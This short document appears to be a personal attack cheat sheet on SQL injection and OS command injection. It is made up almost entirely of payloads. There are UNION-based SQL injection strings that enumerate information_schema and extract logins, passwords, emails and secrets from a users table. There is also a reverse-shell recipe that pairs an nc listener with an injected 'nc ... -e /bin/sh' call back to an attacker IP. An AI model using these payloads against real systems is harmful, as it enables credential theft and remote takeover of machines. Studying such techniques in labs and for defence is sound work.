## SQLi

SELECT * FROM whatever WHERE thing LIKE '{input}%'

```
' OR 1=1;-- 
```

MySQL how to get info about tables

```
SELECT table_name FROM information_schema.tables;
```

figuring out number of columns

```
' UNION SELECT 1, 1, 1, 1, 1, 1, 1;-- 
```

combine with above info to retrieve other tables

```
' UNION SELECT  1, 1, table_name, 1, 1, 1, 1 FROM information_schema.tables;-- 
```

find columns from other table

```
' UNION SELECT  1, 1, column_name, 1, 1, 1, 1 FROM information_schema.columns where table_name = 'users';-- 
```

retrieve info from users table

```
' UNION SELECT  1, id, login, password, email, secret, 1 FROM users;-- 
```

## OS Command injection

; can end previous statement

e.g. 

```
; echo "hello world"
```

**reverse shell**

listener (attacker):

```
nc -l -v -p 4444 
```

on victim

```
; nc 10.0.2.15 4444 -e /bin/sh
```

change IP to whatever the IP of the attacker is